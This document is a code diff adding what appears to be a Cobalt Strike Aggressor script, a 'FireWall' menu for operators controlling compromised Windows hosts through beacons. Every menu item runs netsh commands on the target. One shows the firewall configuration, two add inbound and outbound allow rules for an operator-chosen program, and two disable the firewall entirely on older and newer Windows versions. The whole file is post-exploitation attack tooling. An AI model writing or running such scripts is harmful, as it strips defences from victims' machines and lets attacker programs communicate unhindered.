@@ -1,0 +1,45 @@
+
+#timwhite
+     menu "FireWall" {
+	item "Set Access File" {
+        local('$bid');
+        foreach $bid ($1){
+            prompt_text("filePath", $filePath, {
+                $filePath = $1;
+                return $filePath;
+            });
+        }
+	}
+	item "Firewall Config" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh firewall show config");
+        }
+	}
+	item "Firewall Access all win03-" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh firewall add allowedprogram $filePath \"allow access\" enable");
+        }
+	}
+	item "Firewall Access all win03+" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh advfirewall firewall add rule name=\"pass address\" dir=in action=allow program=\"$filePath\"");
+	    bshell($1, "netsh advfirewall firewall add rule name=\"allow address\" dir=out action=allow program=\"$filePath\"");
+        }
+	}
+	item "Disable Firewall win03-" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh firewall set opmode disable");
+        }
+	}
+	item "Disable Firewall win03+" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "netsh advfirewall set allprofiles state off");
+        }
+	}
+        }
+
